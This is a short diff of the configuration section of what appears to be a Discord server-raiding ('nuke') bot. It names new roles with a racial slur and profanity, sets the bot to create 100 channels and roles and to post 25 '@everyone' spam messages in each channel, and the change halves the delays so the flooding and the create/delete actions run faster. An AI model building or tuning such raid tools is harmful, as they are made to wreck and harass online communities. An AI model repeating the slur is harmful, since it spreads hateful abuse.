@@ -25,8 +25,8 @@ NEW_ROLE_NAME = "GET FUCKED NIGGER"                # Name for new roles
 NUM_TO_CREATE = 100                   # Number of channels and roles to create
 NUM_MESSAGES = 25                     # Number of messages per channel
 MESSAGE_CONTENT = "@everyone GET CLAPPED LMAO 🤣😂😂🤣😂😂🤣😂🤣🤣😂😂🤣😂🙏🙏🙏🙏"
-MESSAGE_DELAY = 0.5                 # Delay (seconds) between messages sent by webhook
-ACTION_DELAY = 1.0                    # Delay (seconds) between create/delete actions
+MESSAGE_DELAY = 0.25                 # Delay (seconds) between messages sent by webhook
+ACTION_DELAY = 0.5                    # Delay (seconds) between create/delete actions
 
 # -----------------------------
 # COG
